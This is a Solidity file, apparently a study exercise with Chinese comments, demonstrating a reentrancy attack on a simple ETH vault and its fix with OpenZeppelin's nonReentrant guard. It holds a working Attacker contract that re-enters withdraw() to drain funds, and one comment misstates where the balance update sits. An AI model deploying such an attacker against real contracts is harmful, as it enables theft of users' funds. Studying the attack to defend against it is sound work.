// 双重攻击示例
// SPDX-License-Identifier: MIT
pragma solidity ^0.8;
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

// // VulnerableVault.sol 受害合约  -- 解决了防御重入攻击
// contract VulnerableVault {
//     mapping(address => uint) public balances;

//     function deposit() external payable {
//         balances[msg.sender] += msg.value;
//     }

//     function withdraw() external {
//         require(balances[msg.sender] > 0, "No balance");
//          // 更新余额（放在调用后，导致漏洞）
//         uint newBalances = balances[msg.sender];
//         balances[msg.sender] = 0;

//         // 发送 ETH（外部调用，容易被攻击者重入）
//         (bool success, ) = msg.sender.call{value: newBalances}("");
//         require(success, "Transfer failed");

       
//     }
// }

// // attrack
// // Attacker.sol
// contract Attacker {
//     VulnerableVault public target;

//     constructor(address _target) {
//         target = VulnerableVault(_target);
//     }

//     // 回调函数，趁机再次提取
//     receive() external payable {
//         if (address(target).balance > 1 ether) {
//             target.withdraw();
//         }
//     }

//     function attack() external payable {
//         require(msg.value >= 1 ether, "Need 1 ETH");
//         target.deposit{value: 1 ether}();
//         target.withdraw();
//     }
// }


contract VulnerableVault is ReentrancyGuard {
    mapping(address => uint) public balances;

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() external  nonReentrant{
        require(balances[msg.sender] > 0, "No balance");
         // 更新余额（放在调用后，导致漏洞）
        uint newBalances = balances[msg.sender];

        // 发送 ETH（外部调用，容易被攻击者重入）
        (bool success, ) = msg.sender.call{value: newBalances}("");
        require(success, "Transfer failed");

        //更新状态
        balances[msg.sender] = 0; // 这里已经使用了 nonReentrant 修饰符，防止重入攻击，可以更改状态。但是最好需要修改状态在调用前，以防万一

       
    }
}

// attrack
// Attacker.sol
contract Attacker {
    VulnerableVault public target;

    constructor(address _target) {
        target = VulnerableVault(_target);
    }

    // 回调函数，趁机再次提取
    receive() external payable {
        if (address(target).balance > 1 ether) {
            target.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need 1 ETH");
        target.deposit{value: 1 ether}();
        target.withdraw();
    }
}